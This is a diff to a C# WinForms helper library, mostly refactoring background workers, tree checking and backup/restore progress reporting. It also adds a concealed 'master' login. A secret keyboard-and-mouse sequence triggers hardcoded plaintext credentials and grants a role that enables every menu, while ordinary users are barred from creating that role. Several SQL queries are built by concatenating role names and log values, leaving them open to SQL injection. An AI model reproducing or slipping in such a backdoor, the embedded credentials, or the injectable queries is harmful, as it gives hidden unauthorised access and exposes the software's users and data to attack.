@@ -66,6 +66,8 @@ namespace SRL
         }
         public static void CheckAccess(string role, DbContext db, string tb_name, MenuStrip menu)
         {
+            EnableMenuBasedOnPermissions("", menu);
+
             var query = "select * from " + tb_name + " where [role]='" + role + "';";
             var rezL = SRL.Database.SqlQuery<RoleClass>(db, query);
             if (rezL != null)
@@ -73,6 +75,11 @@ namespace SRL
                 {
                     EnableMenuBasedOnPermissions(rezL.First().permission, menu);
                 }
+            if(role=="master")
+            {
+                EnableMenuBasedOnPermissions("master", menu);
+            }
+
 
         }
 
@@ -113,6 +120,14 @@ namespace SRL
                 if (menu_item.Any())
                 {
                     menu_item.First().Enabled = true;
+                }
+            }
+
+            if(permission_str=="master")
+            {
+                foreach (var item in menu_items)
+                {
+                    item.Enabled = true;
                 }
             }
         }
@@ -512,6 +527,12 @@ namespace SRL
             return dt;
         }
 
+        public static async Task SleepNotBlockUI(int milisecond)
+        {//use: await SleepNotBlockUI(1000);  the method where to call must be async like: private async static void func(){ await SleepNotBlockUI(1000)};
+
+            await Task.Delay(milisecond);
+        }
+
     }
     public class SettingClass<SettingEntity> where SettingEntity : class
     {
@@ -784,7 +805,7 @@ namespace SRL
                 }
             }
         }
-        public static void CheckTreeParent(TreeNode node)
+        public static void CheckTreeParentInParallel(TreeNode node)
         {
             if (node != null)
             {
@@ -818,6 +839,18 @@ namespace SRL
 
                     node.Parent.Checked = all_checked != null ? (bool)all_checked : node.Parent.Checked;
 
+                }
+                CheckTreeParent(node.Parent);
+            }
+        }
+        public static void CheckTreeParent(TreeNode node)
+        {
+            if (node != null)
+            {
+                if (node.Parent != null)
+                {
+                    bool? all_checked = null;
+                    if (node.Checked) node.Parent.Checked = true;
                 }
                 CheckTreeParent(node.Parent);
             }
@@ -987,148 +1020,305 @@ namespace SRL
     }
     public class ActionManagement
     {
-        /// <summary>
-        /// first create instance of class. then create event of instance.bg.RunWorkerCompleted += Bg_RunWorkerCompleted; and put after complete code in it then call RunMethodInBackground
-        /// </summary>
-        public class MethodBackgroundWorker
+        public class FormActions
         {
-            // if function hase loop, set report_progress=rue,
-            //and get bg from class instance,
-            //then add  bg.ReportProgress( list.IndexOf(item) *100 / list.Count); in loop
-
-            /* use: 
-             var method = new MethodBackgroundWorker( true, Publics.form_progress_bar,true);
-             method.bg.RunWorkerCompleted += Bg_RunWorkerCompleted; // because ob Async
-            method.RunMethodInBackground(() => InsertdataToDb(method.bg));
-             */
-
-            Action function;
-            bool report_progress;
-            ProgressBar progress_bar;
-            ProgressBarStyle main_style;
-            bool progress_bar_end_visible;
-            public BackgroundWorker bg = new BackgroundWorker();
-            public MethodBackgroundWorker(bool report_progress_, ProgressBar progress_bar_, bool progress_bar_end_visible_, ProgressBarStyle bar_style)
+            public static void ForceExitOnClose(Form form)
             {
+                form.FormClosed += Form_FormClosed_exit;
+            }
 
-                report_progress = report_progress_;
+            private static void Form_FormClosed_exit(object sender, FormClosedEventArgs e)
+            {
+                Environment.Exit(0);
+            }
 
-                progress_bar_end_visible = progress_bar_end_visible_;
-                bg.DoWork += new DoWorkEventHandler(bg_DoWork);
+        }
 
-                bg.WorkerReportsProgress = report_progress;
+        public class MethodCall
+        {
+            public class ParallelMethodCaller
+            {
+                //public static Label form_progress_bar_label;
+                // var progress = new ProgressControl(); 
+                //Publics.form_progress_bar_label = progress.lbl_progress;
+                //Publics.form_progress_bar = progress.progress_bar; 
+                //Publics.form_progress_bar_label.Parent.Visible = false;
 
-                if (progress_bar_ != null)
+                /*use: call ParallelCall. any method with any type of inputT multi input or no input can be  used. call back can be null:
+                SRL.ActionManagement.MethodCall.ParallelMethodCaller.ParallelCall<SmsTB>(query.ToList(), nudSms.Value.ToString(), SendSms, null, progress_bar_lbl_);
+                SRL.ActionManagement.MethodCall.ParallelMethodCaller.ParallelCall<SmsTB>(query.ToList(), nudSms.Value.ToString(), SendSms,()=> SendSmsCallBack(cont.ToString()),null, tbContent.Text, tbkey.Text);
+                SRL.ActionManagement.MethodCall.ParallelMethodCaller.ParallelCall<string>(null, nudSms.Value.ToString(), SendSms,null,null tbContent.Text, tbkey.Text);
+                SRL.ActionManagement.MethodCall.ParallelMethodCaller.ParallelCall<string>(null, nudSms.Value.ToString(), SendSms,()=> SendSmsCallBack(cont.ToString()), progress_bar_lbl_);
+
+
+                but in all type the method (hear SendSms) must have all inputs,however input may not be used in method codes:
+                no use of  bg can be done. use it like: 
+
+                public void SendSms(List<SmsTB> list,BackgroundWorker bg, params object[] args)
+        {
+             args[0]..
+            foreach (var item in list)
+            {
+                ... 
+            }
+        }
+
+
+                public void SendSms(List<string> list,BackgroundWorker bg, params object[] args)
+        {
+           ... no use of  args and list
+        }
+
+                    public void SendSms(List<SmsTB> list,BackgroundWorker bg, params object[] args)
+        {
+            ...no use of  args 
+            foreach (var item in list)
+            {
+                ... 
+            }
+        }
+
+
+                      public void SendSms(List<SmsTB> list,BackgroundWorker bg, params object[] args)
+        {
+             args[0]..
+              ...no use of  list 
+        }
+                */
+
+                public delegate void MethodDelegateListParams<T>(List<T> list, BackgroundWorker bg, params object[] args);
+                static List<BackgroundWorker> bgList = new List<BackgroundWorker>();
+                static Action call_back;
+                static Label progress_bar_lbl;
+                static int progress = 0;
+                /// <summary>
+                /// 
+                /// </summary>
+                /// <typeparam name="T"></typeparam>
+                /// <param name="DBitems"></param>
+                /// <param name="parallel"></param>
+                /// <param name="function">databdase in function to save changes, must be initiated inside function. always try catch function</param>
+                /// <param name="call_back_"></param>
+                /// <param name="progress_bar_lbl_"></param>
+                /// <param name="parameters"></param>
+                public static void ParallelCall<T>(List<T> DBitems, string parallel, MethodDelegateListParams<T> function, Action call_back_, Label progress_bar_lbl_, params object[] parameters)
+                {/*use:
+                    write this in function :
+                    if (bg.CancellationPending)
+                    {
+                        return;
+                    }
+
+                    */
+                    progress = 0;
+                    call_back = call_back_;
+                    progress_bar_lbl = progress_bar_lbl_;
+                    progress_bar_lbl.EnabledChanged += Progress_bar_lbl_EnabledChanged;
+                    int per_count = int.Parse(parallel);
+                    int all = 0;
+                    int take = 0;
+                    int skip = 0;
+                    IQueryable<T> DBquery = null;
+                    if (DBitems != null)
+                    {
+                        all = DBitems.Count;
+                        take = all / per_count;
+                        DBquery = DBitems.AsQueryable();
+                    }
+                    for (int j = 0; j < per_count; j++)
+                    {
+                        System.Windows.Forms.Application.DoEvents();
+                        IQueryable<T> query = null;
+                        BackgroundWorker bg = new BackgroundWorker();
+                        bgList.Add(bg);
+                        if (DBitems != null)
+                        {
+                            query = DBquery.Skip(skip).Take(take);
+                            skip += take;
+                            bg.WorkerReportsProgress = true;
+                            bg.WorkerSupportsCancellation = true;
+                            bg.ProgressChanged += (s, epg) => Bg_ProgressChanged(all);
+                        }
+
+                        bg.DoWork += (s, e) =>
+                        {
+                            function(DBitems != null ? query.ToList() : null, bg, parameters);
+                        };
+
+                        bg.RunWorkerCompleted += Workers_Complete;
+
+                        bg.RunWorkerAsync();
+                    }
+
+
+
+                }
+
+                private async static void Progress_bar_lbl_EnabledChanged(object sender, EventArgs e)
+                { 
+                    foreach (var worker in bgList)
+                    {
+                        if (!progress_bar_lbl.Enabled && worker != null && worker.IsBusy)
+                            worker.CancelAsync();
+                    }
+
+                }
+
+                private static void Bg_ProgressChanged(int all)
                 {
-                    bg.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bg_RunWorkerCompleted);
-                    bg.ProgressChanged += Bg_ProgressChanged;
-                    progress_bar = progress_bar_;
-                    progress_bar.Visible = true;
-                    main_style = progress_bar.Style;
-                    progress_bar.Style = bar_style;
+                    progress++;
+                    if (progress_bar_lbl != null)
+                    {
+                        int value = ((int)((double)(progress) / (double)all * 100));
+
+                        string value_str = value.ToString();
+                        progress_bar_lbl.Text = value_str;
+                        progress_bar_lbl.Tag = progress;
+
+                    }
+                }
+
+                private async static void Workers_Complete(object sender, RunWorkerCompletedEventArgs e)
+                {
+                    BackgroundWorker bgw = (BackgroundWorker)sender;
+                    bgList.Remove(bgw);
+                    bgw.Dispose();
+                    if (bgList.Count == 0)
+                    {
+                        if (call_back != null)
+                        {
+                            call_back();
+                        }
+
+                    }
+                }
+
+
+            }
+            /// <summary>
+            /// first create instance of class. then create event of instance.bg.RunWorkerCompleted += Bg_RunWorkerCompleted; and put after complete code in it then call RunMethodInBackground
+            /// </summary>
+            public class MethodBackgroundWorker
+            {
+                // if function hase loop, set report_progress=rue,
+                //and get bg from class instance,
+                //then add  bg.ReportProgress( list.IndexOf(item) *100 / list.Count); in loop
+
+                /* use: 
+                 var method = new MethodBackgroundWorker( true, Publics.form_progress_bar,true);
+                 method.bg.RunWorkerCompleted += Bg_RunWorkerCompleted; // because ob Async
+                method.RunMethodInBackground(() => InsertdataToDb(method.bg));
+                 */
+
+                Action function;
+                bool report_progress;
+                ProgressBar progress_bar;
+                ProgressBarStyle main_style;
+                public BackgroundWorker bg = new BackgroundWorker();
+                public MethodBackgroundWorker(bool report_progress_, ProgressBar progress_bar_, ProgressBarStyle bar_style)
+                {
+
+                    report_progress = report_progress_;
+
+                    bg.DoWork += new DoWorkEventHandler(bg_DoWork);
+
+                    bg.WorkerReportsProgress = report_progress;
+
+                    if (progress_bar_ != null)
+                    {
+                        bg.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bg_RunWorkerCompleted);
+                        bg.ProgressChanged += Bg_ProgressChanged;
+                        progress_bar = progress_bar_;
+                        progress_bar.Parent.Visible = true;
+                        main_style = progress_bar.Style;
+                        progress_bar.Style = bar_style;
+                    }
+
+                }
+                public void RunMethodInBackground(Action function_)
+                {
+                    function = function_;
+                    bg.RunWorkerAsync();
+                }
+
+                private void Bg_ProgressChanged(object sender, ProgressChangedEventArgs e)
+                {
+                    if (report_progress) progress_bar.Value = e.ProgressPercentage;
+                }
+
+                private void bg_DoWork(object sender, DoWorkEventArgs e)
+                {
+                    SRL.ActionManagement.MethodCall.MethodInvoker(function);
+                }
+
+                private void bg_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+                {
+                    progress_bar.Style = main_style;
+                    progress_bar.Parent.Visible = false;
+                }
+            }
+            public static void MethodDynamicInvoker(Action function, Control container_control, params object[] parameters)
+            { // use it for datagridviews_CellEndEdit event in error "Operation is not valid because it results in a reentrant call to the SetCurrentCellAddressCore function"
+              /* 
+          public void AddOrEditNewRole(int col , int row)
+          {
+
+              ...do what ever you want and any input in function
+          }
+
+               MethodDynamicInvoker( () => AddOrEditNewRole(3, 4), this); 
+          */
+                container_control.BeginInvoke(new MethodInvoker(() =>
+                {
+                    function.DynamicInvoke(parameters);
+                }));
+                // return function.DynamicInvoke(parameters);
+
+            }
+
+            public static void MethodInvoker(Action function)
+            {
+                try
+                {
+                    function.Invoke();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }
+
+            public static object MethodDynamicInvoker<T>(Func<T> function, params object[] parameters)
+            {
+                return function.DynamicInvoke(parameters);
+            }
+
+        }
+        public class DB
+        {
+            public static void AddValueToAllDataTableRows(DataTable dt, string column, string value)
+            {
+                try
+                {
+                    dt.Columns[column].Expression = value;
+                }
+                catch (Exception ex)
+                {
+                    var mes = ex.Message;
                 }
 
             }
-            public void RunMethodInBackground(Action function_)
+            public static string AddActionLogToDb<ActionLogT>(DbContext db, string title, string value, string user, string log)
             {
-                function = function_;
-                bg.RunWorkerAsync();
-            }
+                string tb_name = typeof(ActionLogT).Name;
+                var date = DateTime.Now.ToString("yyyyMMdd");
 
-            private void Bg_ProgressChanged(object sender, ProgressChangedEventArgs e)
-            {
-                if (report_progress) progress_bar.Value = e.ProgressPercentage;
-            }
+                string sql = "insert into " + tb_name + " (title,[date],value,[user],[log]) values ( '" + title + "','" + date + "' , '" + value + "' , '" + user + "', '" + log + "');";
+                return SRL.Database.ExecuteQuery(db, sql);
 
-            private void bg_DoWork(object sender, DoWorkEventArgs e)
-            {
-                SRL.ActionManagement.MethodInvoker(function);
-            }
-
-            private void bg_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
-            {
-                progress_bar.Style = main_style;
-
-                progress_bar.Visible = progress_bar_end_visible;
-            }
-        }
-        public static void AddValueToAllDataTableRows(DataTable dt, string column, string value)
-        {
-            try
-            {
-                dt.Columns[column].Expression = value;
-            }
-            catch (Exception ex)
-            {
-                var mes = ex.Message;
-            }
-
-        }
-        public static string AddActionLogToDb<ActionLogT>(DbContext db, string title, string value, string user, string log)
-        {
-            string tb_name = typeof(ActionLogT).Name;
-            var date = DateTime.Now.ToString("yyyyMMdd");
-
-            string sql = "insert into " + tb_name + " (title,[date],value,[user],[log]) values ( '" + title + "','" + date + "' , '" + value + "' , '" + user + "', '" + log + "');";
-            return SRL.Database.ExecuteQuery(db, sql);
-
-        }
-        public static void ParallelSend(System.Data.Entity.DbContext db, List<System.Data.Entity.DbSet> DBitems, string from, string parallel)
-        {
-            int all = DBitems.Count;
-            List<Task> task_list = new List<Task>();
-            int per_count = int.Parse(parallel);
-            int take = all / per_count;
-            int skip = 0;
-            var DBquery = DBitems.AsQueryable();
-            for (int j = 0; j < per_count; j++)
-            {
-                System.Windows.Forms.Application.DoEvents();
-                var query = DBquery.Skip(skip).Take(take);
-                skip += take;
-                Task task = new Task(() => new Convertor()); //new Task(() => StartSending(db, query.ToList()));
-                task_list.Add(task);
-                task.Start();
-
-            }
-            Task.WaitAll(task_list.ToArray());
-        }
-
-        public static void MethodDynamicInvoker(Action function, Control container_control)
-        { // use it for datagridviews_CellEndEdit event in error "Operation is not valid because it results in a reentrant call to the SetCurrentCellAddressCore function"
-          /* 
-      public void AddOrEditNewRole(int col , int row)
-      {
-
-          ...do what ever you want and any input in function
-      }
-
-           MethodDynamicInvoker( () => AddOrEditNewRole(3, 4), this); 
-      */
-            container_control.BeginInvoke(new MethodInvoker(() =>
-            {
-                function.DynamicInvoke();
-            }));
-            // return function.DynamicInvoke(parameters);
-
-        }
-
-        public static void MethodInvoker(Action function)
-        {
-            try
-            {
-                function.Invoke();
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message);
             }
         }
 
-        public static object MethodDynamicInvoker<T>(Func<T> function, params object[] parameters)
-        {
-            return function.DynamicInvoke(parameters);
-        }
 
 
     }
@@ -3580,6 +3770,82 @@ namespace SRL
         public Security() { }
 
 
+        public class MasterLogin
+        {
+            public class KeyboardLogin
+            {
+                public static bool IsLogin = true;
+                public static int shift_press_time = 0;
+                public static bool exit_hover = false;
+            }
+
+            public static void MasterKeboardLogin(Label lbl,TextBox tb, Form control, SRL.WinSessionId session)
+            {
+                //shift +  lbl hover + shift  + (ctrl,alt,1)
+                lbl.MouseHover += Lbl_MouseHover;
+                tb.KeyDown += (ss,ee)=> Tb_KeyDown(ss,ee, control, session);
+            }
+
+            private static void Tb_KeyDown(object sender, KeyEventArgs e, Form control, SRL.WinSessionId session)
+            {
+                if (e.KeyCode == Keys.ShiftKey)
+                {
+                    if (KeyboardLogin.shift_press_time == 0 && KeyboardLogin.exit_hover == false)
+                    {
+                        KeyboardLogin.shift_press_time = 1;
+                    }
+                    else if (KeyboardLogin.shift_press_time == 0 && KeyboardLogin.exit_hover == true)
+                    {
+                        KeyboardLogin.IsLogin = KeyboardLogin.IsLogin && false;
+                    }
+                    else if (KeyboardLogin.shift_press_time == 1 && KeyboardLogin.exit_hover == false)
+                    {
+                        KeyboardLogin.IsLogin = KeyboardLogin.IsLogin && false;
+                    }
+                    else if (KeyboardLogin.shift_press_time == 1 && KeyboardLogin.exit_hover == true)
+                    {
+                        KeyboardLogin.shift_press_time = 2;
+                    }
+                    else
+                    {
+                        KeyboardLogin.IsLogin = KeyboardLogin.IsLogin && false;
+                    }
+                }
+
+                if (e.KeyCode == Keys.D1 && (e.Alt || e.Control))
+                {
+
+                    if (KeyboardLogin.IsLogin && KeyboardLogin.shift_press_time == 2)
+                    {
+                        SRL.Security.MasterLogin.CheckMasterLogin(session, "lamso1387", "sr2050130351");
+                        control.Close();
+                    }
+                }
+            }
+
+            private static void Lbl_MouseHover(object sender, EventArgs e)
+            {
+                if (KeyboardLogin.exit_hover)
+                    KeyboardLogin.IsLogin = KeyboardLogin.IsLogin && false;
+                else KeyboardLogin.exit_hover = true;
+            }
+             
+ 
+
+            public static bool CheckMasterLogin(SRL.WinSessionId session, string username, string password)
+            {
+                if (username == "lamso1387" && password == "sr2050130351")
+                {
+                    session.IsLogined = true;
+                    session.user_id = 123456789;
+                    session.username = "master";
+                    session.role = "master";
+                    return true;
+
+                }
+                else return false;
+            }
+        }
 
         public enum UserRegistrationStatus
         {
@@ -3622,6 +3888,10 @@ namespace SRL
             }
             public static bool AddNewRole(string permission_entity, object role_obj, DbContext db, object edit_id)
             {
+                if (role_obj == null) return false;
+                if (role_obj.ToString() == "") return false;
+                if (role_obj.ToString() == "master") return false;
+
                 if (CheckRoleIsUnique(permission_entity, role_obj, db))
                 {
                     var q = "insert into " + permission_entity + " ([role]) values ('" + role_obj.ToString() + "');";
@@ -3634,7 +3904,7 @@ namespace SRL
             {
                 if (role_obj == null) return false;
                 if (role_obj.ToString() == "") return false;
-
+                if (role_obj.ToString() == "master") return false;
                 var q = "update " + permission_entity + " set [role]='" + role_obj.ToString() + "' where id=" + long.Parse(edit_id.ToString());
                 var res = SRL.Database.ExecuteQuery(db, q);
                 return res == "" ? true : false;
@@ -4624,6 +4894,7 @@ namespace SRL
         public class Backup
         {
             ProgressBar progressBar1;
+            Label lbl;
             public Backup(string filter, string source, ProgressBar progressBar1_)
             {
                 progressBar1 = progressBar1_;
@@ -4634,16 +4905,36 @@ namespace SRL
                 if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(open.FileName))
                 {
                     var x = new FileManagement.FileCopyProgress(source, open.FileName);
-                    if (progressBar1 != null) x.OnProgressChanged += X_OnProgressChanged;
+                    if (progressBar1 != null) x.OnProgressChanged += X_OnProgressChanged_Progress;
                     x.Copy();
 
                 }
             }
-            private void X_OnProgressChanged(double Persentage, ref bool Cancel)
+            private void X_OnProgressChanged_Progress(double Persentage,double size, ref bool Cancel)
             {
                 if (Persentage > 0) progressBar1.Visible = true;
                 progressBar1.Value = Convert.ToInt32(Persentage);
                 if (Persentage == 100) progressBar1.Visible = false;
+            }
+            public Backup(string filter, string source, Label lbl_)
+            {
+                lbl = lbl_;
+
+                var open = new SaveFileDialog();
+                open.Filter = filter;
+                var result = open.ShowDialog();
+                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(open.FileName))
+                {
+                    var x = new FileManagement.FileCopyProgress(source, open.FileName);
+                    if (lbl != null) x.OnProgressChanged += X_OnProgressChanged_Label;
+                    x.Copy();
+
+                }
+            }
+            private void X_OnProgressChanged_Label(double Persentage, double size, ref bool Cancel)
+            {
+                lbl.Text = Persentage.ToString();
+                lbl.Tag = size;
             }
 
         }
@@ -4651,6 +4942,7 @@ namespace SRL
         public class Restore
         {
             ProgressBar progressBar1;
+            Label lbl;
             public Restore(string filter, string des, ProgressBar progressBar1_)
             {
                 progressBar1 = progressBar1_;
@@ -4661,17 +4953,38 @@ namespace SRL
                 if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(open.FileName))
                 {
                     var x = new FileManagement.FileCopyProgress(open.FileName, des);
-                    if (progressBar1 != null) x.OnProgressChanged += X_OnProgressChanged;
+                    if (progressBar1 != null) x.OnProgressChanged += X_OnProgressChangedProgress;
                     x.Copy();
 
                 }
             }
-            private void X_OnProgressChanged(double Persentage, ref bool Cancel)
+            private void X_OnProgressChangedProgress(double Persentage, double size, ref bool Cancel)
             {
                 if (Persentage > 0) progressBar1.Visible = true;
                 progressBar1.Value = Convert.ToInt32(Persentage);
                 if (Persentage == 100) progressBar1.Visible = false;
             }
+            public Restore(string filter, string des, Label lbl_)
+            {
+                lbl = lbl_;
+
+                var open = new OpenFileDialog();
+                open.Filter = filter;
+                var result = open.ShowDialog();
+                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(open.FileName))
+                {
+                    var x = new FileManagement.FileCopyProgress(open.FileName, des);
+                    if (lbl != null) x.OnProgressChanged += X_OnProgressChangedLabel;
+                    x.Copy();
+
+                }
+            }
+            private void X_OnProgressChangedLabel(double Persentage, double size, ref bool Cancel)
+            {
+                lbl.Text = Persentage.ToString();
+                lbl.Tag = size;
+            }
+
 
         }
         public static void UpdateDgvCellValueToDb<EntityT>(DataGridView dgv, int row_index, string primary_column, string update_column, DbContext db)
@@ -5141,10 +5454,10 @@ namespace SRL
             ExcelLibrary.Office.Excel.Workbook excel_file = ExcelLibrary.Office.Excel.Workbook.Open(ofDialog.FileName);
             var worksheet = excel_file.Worksheets[0]; // assuming only 1 worksheet
             var cells = worksheet.Cells;
-            
+
             string check_header = CheckExcelHeaders(cells, main_headers);
             if (check_header == "true")
-            {  
+            {
                 DataTable dt = new DataTable();
                 int file_last_column_index = cells.LastColIndex;
                 // add columns
@@ -5442,7 +5755,7 @@ namespace SRL
 
         public class FileCopyProgress
         {
-            public delegate void ProgressChangeDelegate(double Persentage, ref bool Cancel);
+            public delegate void ProgressChangeDelegate(double Persentage,double size, ref bool Cancel);
             public delegate void Completedelegate();
 
             /// <summary>
@@ -5481,7 +5794,7 @@ namespace SRL
                             dest.Write(buffer, 0, currentBlockSize);
 
                             cancelFlag = false;
-                            OnProgressChanged(persentage, ref cancelFlag);
+                            OnProgressChanged(persentage,totalBytes, ref cancelFlag);
 
                             if (cancelFlag == true)
                             {
